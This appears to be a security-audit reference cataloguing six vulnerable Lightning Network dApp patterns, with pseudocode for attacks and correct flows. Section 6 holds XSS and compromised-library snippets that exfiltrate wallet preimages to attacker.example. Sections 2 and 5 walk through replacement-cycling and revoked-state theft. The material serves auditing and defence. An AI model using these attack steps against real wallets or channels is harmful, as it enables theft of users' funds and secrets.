# Vulnerable Lightning Network dApp Patterns

This document catalogs six vulnerable LN dApp patterns with pseudocode demonstrations. Each pattern corresponds to one or more checkpoints in the main SKILL.md checklist.

---

## 1. Premature Preimage Revelation (Free Option Attack)

**Related checkpoints:** 0x0000, 0x0002

**Vulnerability:** A swap service or payment intermediary reveals the preimage before the incoming HTLC is irrevocably committed on the incoming channel, granting the payer a "free option" — they learn the preimage (proof of payment) without the receiver being guaranteed payment. This is the core mechanism behind CVE-2020-26896.

```
# Submarine swap service: user pays LN invoice, service claims on-chain HTLC

# Step 1: Service generates preimage and payment_hash
preimage = csprng(32)
payment_hash = SHA256(preimage)

# Step 2: Service creates on-chain HTLC locked to payment_hash
on_chain_htlc = Script(
    OP_IF
        OP_SHA256 <payment_hash> OP_EQUALVERIFY <user_pubkey> OP_CHECKSIG  # claim path
    OP_ELSE
        <service_timeout> OP_CHECKLOCKTIMEVERIFY OP_DROP <service_pubkey> OP_CHECKSIG  # refund
    OP_ENDIF
)
broadcast(fund_tx, output=on_chain_htlc, value=swap_amount)

# Step 3: User pays LN invoice (hash = payment_hash)
# The LN payment propagates hop-by-hop toward the service

# === VULNERABILITY: Service reveals preimage too early ===
# Service settles the LN invoice (revealing preimage to the LN route)
# BEFORE confirming the on-chain funding tx has sufficient confirmations

settle_invoice(preimage)  # Preimage now visible to all hops in the route

# User learns preimage from the settled invoice
# User claims on-chain HTLC using the preimage
claim_tx = spend(on_chain_htlc, witness=[user_sig, preimage, OP_TRUE])
broadcast(claim_tx)

# Result: User has both the preimage (proof of payment) AND the on-chain funds
# Service revealed the preimage but the on-chain HTLC funding tx
# might be reorged out — service loses the swap amount

# === CORRECT FLOW ===
# Service must wait for on-chain HTLC to reach sufficient confirmation depth
# BEFORE settling the LN invoice and revealing the preimage
wait_for_confirmations(fund_tx, min_depth=3)
settle_invoice(preimage)  # Safe: on-chain HTLC is irrevocably committed
```

**Why it works:** The preimage is the atomic link between the LN payment and the on-chain HTLC. Once revealed, the payer can claim the on-chain leg. If the on-chain leg is not yet irrevocably committed (insufficient confirmations or unconfirmed), a reorg or double-spend can void the on-chain HTLC while the preimage is already exposed — the service loses funds.

---

## 2. Replacement Cycling Attack

**Related checkpoints:** 0x000a, 0x0009

**Vulnerability:** An attacker uses RBF (Replace-By-Fee) to cycle a victim's timeout transaction out of the mempool, preventing it from confirming before the HTLC expires. The attacker repeatedly replaces the victim's transaction with their own higher-fee transaction, then replaces their own transaction to recover the fees — an infinite loop that starves the victim's timeout enforcement.

```
# HTLC on channel: Alice → Bob, timeout at block height H

# Alice forwards HTLC to Bob. Bob does not settle (or deliberately stalls).
# Alice needs to claim the HTLC-timeout after block H.

# At block H, Alice broadcasts her HTLC-timeout transaction:
alice_timeout_tx = create_htlc_timeout(
    input=htlc_output,
    timelock=H,
    fee_rate=10 sat/vB
)
broadcast(alice_timeout_tx)  # enters mempool

# === ATTACK: Bob performs replacement cycling ===

# Cycle 1: Bob broadcasts a conflicting tx that spends the same HTLC output
# Bob can do this because he knows the preimage (or uses a different spend path)
bob_replacement = create_htlc_claim(
    input=htlc_output,
    preimage=preimage,       # Bob has the preimage
    fee_rate=15 sat/vB       # Higher fee than Alice — replaces her tx via RBF
)
broadcast(bob_replacement)    # Alice's timeout tx is evicted from mempool

# Cycle 2: Bob immediately replaces his OWN transaction with a lower-fee version
# that spends a DIFFERENT input, effectively "recovering" the fee budget
bob_recovery = create_unrelated_tx(
    input=bob_other_utxo,
    fee_rate=5 sat/vB
)
# Bob's replacement is itself replaced or expires — the HTLC output is "free" again

# Cycle 3: Alice re-broadcasts her timeout tx, Bob repeats the cycle
# This continues until the upstream HTLC timelock expires
# At that point, Alice's upstream counterparty claims the timeout,
# and Alice loses the HTLC value

# Net result: Bob prevented Alice's timeout tx from confirming
# while the upstream HTLC expired — Alice is stuck in the middle
```

**Why it works:** Bitcoin's RBF policy allows any unconfirmed transaction to be replaced by a higher-fee transaction spending the same inputs. The attacker cycles replacements to keep the victim's transaction out of the mempool indefinitely, running out the HTLC timelock. The attacker's net cost is only the incremental relay fees, not the full replacement fees, because they recover their transaction fees by replacing their own transactions.

---

## 3. Timelock Boundary Confusion (500M Threshold)

**Related checkpoints:** 0x0004

**Vulnerability:** Bitcoin's `OP_CHECKLOCKTIMEVERIFY` (CLTV) interprets values below 500,000,000 as block heights and values at or above 500,000,000 as Unix timestamps. If a dApp constructs a CLTV value that crosses this boundary (e.g., a block height calculation that overflows into the timestamp range), the timelock becomes either immediately satisfiable or locked for decades.

```
# Current block height: 850,000
# dApp wants a timelock of 1,000,000 blocks into the future (mistake — too large)

intended_timeout = current_block_height + large_delta
# intended_timeout = 850,000 + 1,000,000 = 1,850,000
# 1,850,000 < 500,000,000 → interpreted as block height — OK (far future)

# === BUG CASE: dApp uses timestamp arithmetic instead ===
current_time = 1700000000  # Unix timestamp (Nov 2023)
timeout_seconds = 86400    # 24 hours
intended_timeout = current_time + timeout_seconds
# intended_timeout = 1700086400 → this is >= 500,000,000
# Interpreted as Unix timestamp — correct if nLockTime is also a timestamp

# === CRITICAL BUG: mixing block height and timestamp ===
# HTLC on-chain script uses CLTV with a block height
htlc_script = Script(
    <cltv_expiry> OP_CHECKLOCKTIMEVERIFY OP_DROP <pubkey> OP_CHECKSIG
)

# LN node calculates cltv_expiry using timestamp accidentally:
cltv_expiry = unix_timestamp(now() + 24h)
# cltv_expiry = 1700086400 (>= 500M → timestamp domain)

# Transaction's nLockTime is set to a block height (e.g., 850,100)
# nLockTime = 850,100 (< 500M → block height domain)

# OP_CHECKLOCKTIMEVERIFY FAILS:
# Rule: if cltv_expiry >= 500M, then nLockTime must also be >= 500M
# But nLockTime (850,100) < 500M while cltv_expiry (1,700,086,400) >= 500M
# → SCRIPT FAILURE: funds locked permanently (no valid nLockTime can satisfy both)

# === REVERSE BUG: block height overflows into timestamp range ===
# Extremely large block height delta:
cltv_expiry = 499_999_999  # Just below boundary — block height
# Adding a safety margin:
cltv_expiry_with_margin = 499_999_999 + 100 = 500_000_099
# Now >= 500M → suddenly interpreted as Unix timestamp (year 1985)
# This timestamp is in the past → timelock is immediately satisfiable!
# Attacker can claim the HTLC immediately
```

**Why it works:** Bitcoin consensus treats CLTV values in two disjoint domains (block height < 500M, Unix timestamp >= 500M) and requires the transaction's `nLockTime` to be in the same domain. Crossing the boundary makes the script unsatisfiable (permanent lock) or trivially satisfiable (immediate claim), depending on direction.

---

## 4. Submarine Swap Non-Atomicity

**Related checkpoints:** 0x0007, 0x0008

**Vulnerability:** In a submarine swap (on-chain → Lightning), the atomicity depends on proper hashlock binding and timelock ordering between the on-chain HTLC and the LN payment. If the timelocks are misconfigured, a race condition allows the swap service to claim the on-chain HTLC (via preimage) while the LN payment times out — or the user to get a refund while also receiving the LN payment.

```
# Submarine swap: User sends on-chain BTC, receives LN payment
# Service generates: preimage, payment_hash = SHA256(preimage)

# On-chain HTLC (funded by user):
on_chain_htlc = Script(
    OP_IF
        OP_SHA256 <payment_hash> OP_EQUALVERIFY <service_pubkey> OP_CHECKSIG
    OP_ELSE
        <user_refund_timeout> OP_CHECKLOCKTIMEVERIFY OP_DROP <user_pubkey> OP_CHECKSIG
    OP_ENDIF
)

# LN invoice created by service:
ln_invoice = create_invoice(payment_hash=payment_hash, expiry=ln_timeout)

# === VULNERABILITY: timelock ordering violation ===
# CORRECT ordering: user_refund_timeout > ln_timeout + safety_margin
# This ensures the service can claim on-chain AFTER the LN payment settles
# but the user cannot refund until the LN payment has definitively expired

# BUG: user_refund_timeout <= ln_timeout (or insufficient margin)
user_refund_timeout = block_height + 100
ln_timeout = block_height + 120  # LN timeout is AFTER on-chain refund!

# Race condition timeline:
# Block +100: User's on-chain refund path becomes available
# Block +120: LN invoice expires
#
# Between block +100 and +120:
# - User claims on-chain refund (timelock expired)
# - Service settles LN invoice (reveals preimage to user's LN node)
# - User receives LN payment AND on-chain refund — double spend!

# === CORRECT CONFIGURATION ===
# user_refund_timeout must be strictly greater than ln_timeout + safety_budget
safety_budget = 72  # blocks (~12 hours for fee spikes + confirmations)
ln_timeout = block_height + 100
user_refund_timeout = ln_timeout + safety_budget  # block_height + 172

# Now the service has 72 blocks after LN timeout to claim on-chain
# The user cannot refund until after the service's claim window
```

**Why it works:** Atomicity in submarine swaps requires that the on-chain refund path is NEVER available while the Lightning payment can still settle. If the user can refund on-chain while the service can still settle the LN invoice (both paths open simultaneously), the user can execute both, receiving the LN payment and the on-chain refund.

---

## 5. Watchtower Bypass via Breach During Downtime

**Related checkpoints:** 0x000c, 0x000d

**Vulnerability:** Lightning channels rely on the counterparty or a watchtower being online to detect and penalize old state broadcasts (breach attempts). If both the channel holder and their watchtower are offline during the dispute period, a malicious counterparty can broadcast a revoked commitment transaction and claim all channel funds after the timelock expires.

```
# Channel state: Alice and Bob have a channel
# Current state: commitment_tx_N (Alice: 0.7 BTC, Bob: 0.3 BTC)
# Previous state: commitment_tx_N-1 (Alice: 0.3 BTC, Bob: 0.7 BTC)

# Alice has revocation_secret for Bob's commitment_tx_N-1
# This allows Alice to claim ALL funds if Bob broadcasts commitment_tx_N-1

# === ATTACK: Bob broadcasts revoked state while Alice is offline ===
# Bob waits for Alice and her watchtower to go offline (planned maintenance,
# network outage, key rotation, or targeted DDoS)

broadcast(bob_commitment_tx_N_minus_1)  # Old state: Bob gets 0.7 BTC

# Bob's to_local output has a CSV (CheckSequenceVerify) delay:
bob_to_local = Script(
    OP_IF
        <alice_revocation_pubkey> OP_CHECKSIG        # penalty path
    OP_ELSE
        <to_self_delay> OP_CHECKSEQUENCEVERIFY OP_DROP
        <bob_delayed_pubkey> OP_CHECKSIG              # Bob claims after delay
    OP_ENDIF
)
# to_self_delay = 144 blocks (~24 hours)

# === Scenario A: Watchtower is online ===
# Watchtower detects breach, broadcasts penalty tx using alice_revocation_secret
penalty_tx = spend(
    input=bob_to_local_output,
    witness=[alice_revocation_sig, OP_TRUE],  # penalty path
    output=alice_address,
    value=all_channel_funds
)
broadcast(penalty_tx)  # Alice gets ALL funds (penalty for breach)

# === Scenario B: Watchtower is OFFLINE ===
# No one detects the breach for 144 blocks
# After CSV delay expires, Bob claims the to_local output:
bob_claim = spend(
    input=bob_to_local_output,
    witness=[bob_sig, OP_FALSE],  # delayed claim path (CSV satisfied)
)
broadcast(bob_claim)  # Bob steals 0.4 BTC (difference between old and new state)

# === ADDITIONAL FAILURE: revocation secret not stored durably ===
# Alice suffered a database crash and lost revocation_secret for state N-1
# Even if Alice comes online during the 144-block window, she cannot
# construct the penalty transaction without the revocation secret
```

**Why it works:** The Lightning penalty mechanism requires active monitoring during the dispute period (CSV delay on the broadcaster's to_local output). If the aggrieved party AND all watchtowers fail to broadcast the penalty transaction within this window, the breach succeeds. Revocation secret loss makes the penalty permanently unenforceable.

---

## 6. Client-Side Preimage Exfiltration

**Related checkpoints:** 0x000e

**Vulnerability:** Browser-based Lightning wallets and web-embedded LN payment interfaces store preimages and signing keys in JavaScript memory, localStorage, IndexedDB, or browser extension storage. XSS vulnerabilities, malicious browser extensions, or compromised CDN scripts can exfiltrate preimages, enabling an attacker to claim HTLCs or prove payment without authorization.

```
# Browser-based Lightning wallet stores preimage after receiving payment

# User receives LN payment — wallet stores preimage for proof of payment
function onPaymentReceived(invoice, preimage) {
    // Store preimage in localStorage (VULNERABLE)
    localStorage.setItem(`preimage_${invoice.payment_hash}`, preimage.hex())

    // Or in IndexedDB
    db.payments.put({ hash: invoice.payment_hash, preimage: preimage.hex() })

    // Or in JavaScript memory (STILL VULNERABLE to XSS)
    window.__wallet_state.preimages[invoice.payment_hash] = preimage
}

# === ATTACK 1: XSS exfiltration ===
# Attacker injects script via XSS (reflected, stored, or DOM-based)
<script>
    // Steal all preimages from localStorage
    const keys = Object.keys(localStorage).filter(k => k.startsWith('preimage_'))
    const preimages = keys.map(k => ({ key: k, value: localStorage.getItem(k) }))
    fetch('https://attacker.example/exfil', {
        method: 'POST',
        body: JSON.stringify(preimages)
    })
</script>

# === ATTACK 2: Malicious browser extension ===
# Extension with "storage" permission reads wallet data
chrome.storage.local.get(null, function(items) {
    // Access all stored preimages and private keys
    sendToAttacker(items)
})

# === ATTACK 3: Compromised CDN/dependency ===
# A third-party script loaded by the wallet page
# (analytics, UI library, polyfill) is compromised
// Compromised library patches the wallet's receive function
const originalReceive = wallet.onPaymentReceived
wallet.onPaymentReceived = function(invoice, preimage) {
    // Silently exfiltrate preimage before normal processing
    navigator.sendBeacon('https://attacker.example/exfil',
        JSON.stringify({ hash: invoice.payment_hash, preimage: preimage.hex() }))
    return originalReceive.call(this, invoice, preimage)
}

# === IMPACT ===
# Stolen preimages allow attacker to:
# 1. Prove payment for invoices they did not pay (proof-of-payment fraud)
# 2. Claim HTLCs on other channels using the same payment_hash
# 3. Combined with stolen channel keys, construct valid commitment transactions
```

**Why it works:** Browser environments provide no hardware-backed isolation for cryptographic secrets. Any JavaScript running in the same origin (or with extension permissions) can access wallet state. Unlike hardware wallet signing where the key never leaves the secure element, browser-based LN wallets expose preimages and keys to the full web attack surface.
